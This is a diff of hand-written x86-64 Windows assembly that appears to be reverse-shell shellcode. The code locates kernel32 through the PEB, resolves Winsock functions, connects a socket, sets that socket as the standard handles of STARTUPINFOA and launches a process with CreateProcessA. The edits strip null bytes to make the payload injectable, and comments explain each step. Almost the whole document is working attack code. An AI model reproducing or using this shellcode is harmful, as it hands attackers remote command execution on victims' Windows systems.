@@ -26,21 +26,26 @@ main:
    ; int3 
     push rbp
     mov rbp, rsp
-    sub rsp, 200
-    mov rax, [gs:0x60]   ; get address of PEB by adding 60h in TEB. get TEB from GS register. Windbg -> dt nt!_teb <address>
+    xor rax, rax
+    mov al, 200
+    sub rsp, rax
+    xor rax, rax
+    mov rax, [gs:60h + rax]   ; get address of PEB by adding 60h in TEB. get TEB from GS register. Windbg -> dt nt!_teb <address>
                          ; dt nt!_PEB <address>
     mov rax, [rax+0x18]  ; get address of LDR within PEB by adding 18h in PEB. 
     mov rax, [rax+0x20]  ; get address of InMemoryOrderModuleList within LDR by adding 20h into address of LDR. InMemoryOrderModuleList is a doubly linked list.
                          ; in the destination rax register we have address of EXE itself 
-    mov rax, [rax]  ; Second thing in InMemoryOrderModuleList is ntdll.dll itself
-    mov rax, [rax]  ; Third thing kin InMemoryOrderModuleList is kernel32.dll
+    xor r15, r15
+    mov rax, [rax + r15]  ; Second thing in InMemoryOrderModuleList is ntdll.dll itself
+    mov rax, [rax + r15]  ; Third thing kin InMemoryOrderModuleList is kernel32.dll
                     ; Windbg -> dt _LDR_DATA_TABLE_ENTRY <address>. Here address is stored in rax
     mov rax, [rax+20h] ; Here we got the base address of kernel32.dll
     mov [rbp-8h], rax ; saving address in stack. KERNEL32.DLL BASE ADDRESS IN RBP-8(STACK)
     xor rbx, rbx
     mov bx, [rax+0x3c] ; Here we got offset of NT header
     add rax, rbx  ; adding offset in baseaddress of kernel32.dll
-    mov eax, [rax+88h]  ; Here we got the RVA of explort table
+    mov r12b, 0x88
+    mov eax, [rax+r12]  ; Here we got the RVA of explort table
     add rax, [rbp-8h]  ; VA of export table 
 
     mov ebx, [rax+1ch]  ; address of function
@@ -118,16 +123,25 @@ main:
     mov [rbp-40], rax
     add rsp, 40h
 
-    ;mov cx, 202h
+    
     xor rcx, rcx
-    mov cx, 0x0190  ; the value to be moved in cx should be 202h but 190h will also work as it is less than 202h
+    mov cx, 202h    ; verified by reverse engineering a C code in Windbg. 
+    ;mov cx, 0x0190  ; the value to be moved in cx should be 202h but 190h will also work as it is less than 202h
                     ; plus we can notice that size of WSADATA structure is 190h
-    sub rsp, rcx
+                    ;If the version requested by the application is equal to or higher than the lowest
+                    ;version supported by the Winsock DLL, the call succeeds and the Winsock DLL returns
+                    ;detailed information in the WSADATA structure pointed to by the lpWSAData parameter
+    xor r8, r8
+    mov r8w, 0x198   ; I tried to print the size of structure and it came out to be 198h
+    sub rsp, r8
+    ;sub rsp, rcx
     mov rdx, rsp
     sub rsp, 30h
     and rsp, 0FFFFFFFFFFFFFFF0h
     call [rbp-40]  ;  calling WSAStartup "this works"
-    add rsp, 0x0190
+    xor rcx, rcx
+    mov cx, 0x01C8
+    add rsp, rcx
 
      ; getting address of WSASocketA()
     ; calling get proc address
@@ -147,11 +161,12 @@ main:
 
     ; calling WSASocketA
     ; setting up parameters
-    
+    xor rdx, rdx
+    xor rcx, rcx
     xor     r9, r9  ; fourth arg
-    mov     r8d, 6  ; third arg
-    mov     edx, 1  ; second arg
-    mov     ecx, 2  ; first arg
+    mov     r8b, 6  ; third arg
+    mov     dl, 1  ; second arg
+    mov     cl, 2  ; first arg
     sub rsp, 40h    ; before setting up arguments in stack we need to create a stack for the function we are going to call
     and rsp, 0FFFFFFFFFFFFFFF0h
     mov [rsp+20h], r9   ; fifth arg
@@ -201,7 +216,7 @@ main:
     ;ended up setting value
     ;push rbx
     mov rdx, rsp ; setting up pointer to sockaddr_in structure to rdx
-    mov r8d, 10h
+    mov r8b, 10h
     sub rsp, 30h
     call [rbp-56]   ; calling connect function
     add rsp, 40h
@@ -254,6 +269,7 @@ main:
     ;    1 HANDLE  hStdError;  -->we need to set this   --> socket handle [rbp-48]
     ;} STARTUPINFOA, *LPSTARTUPINFOA;
     xor rdx, rdx
+    ;xor rcx, rcx
     ; starting structure
     mov r14, [rbp-48]
     push r14 ; 1 This counting is started from last member of structure
@@ -261,18 +277,23 @@ main:
     push r14; 3
     push rdx ; 4
     push rdx ; 5-6
-    ;mov rcx, 0x1010000000000000 ; 7-8 ; 0000010100000000
-    mov rcx, 0x0000010100000000
-    push rcx ; 7-8
+    ; 0000010100000000
+    ;mov rcx, 0x0000010100000000  ;This is giving null bytes
+    ;push rcx ; 7-8
+    push rdx ; 7-8
     push rdx ; 9-10
     push rdx ; 11-12
     push rdx ; 13-14
     push rdx ; 15
     push rdx ; 16
     push rdx ; 17
-    mov rcx, 104
+    xor rcx, rcx
+    mov cl, 104
     push rcx ; 
     ;structure end
+    xor r14, r14        ; Setting up dflag member of structure
+    mov r14w, 0x0101    ; Setting up dflag member of structure
+    mov [rsp+0x3C], r14 ; Setting up dflag member of structure
     mov r10, rsp  ; Pointer to STARTUPINFOA
 
 ;Step2. b)
@@ -312,6 +333,6 @@ main:
     mov [rsp+48h], r11   ; arg 10
     call [rbp-64] ; calling CreateProcessA 
 
-    ;still need to work on thisto remove null bytes
+
     ;nop
     ret
